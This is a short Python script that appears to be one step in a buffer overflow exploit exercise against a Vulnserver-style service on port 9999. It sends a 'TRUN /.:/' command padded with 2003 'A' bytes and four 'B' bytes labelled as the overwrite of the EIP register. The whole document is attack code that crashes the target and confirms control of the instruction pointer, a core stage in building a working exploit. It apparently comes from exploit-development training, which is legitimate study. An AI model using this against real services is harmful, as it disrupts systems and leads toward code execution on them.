#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

offset = 2003

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	payload = b""
	payload += b"TRUN /.:/"
	payload += b"A" * offset # Padding
	payload += b"B" * 4 # EIP

	s.send(payload)
	s.close()

except:
	print("Error connecting to server")
	sys.exit()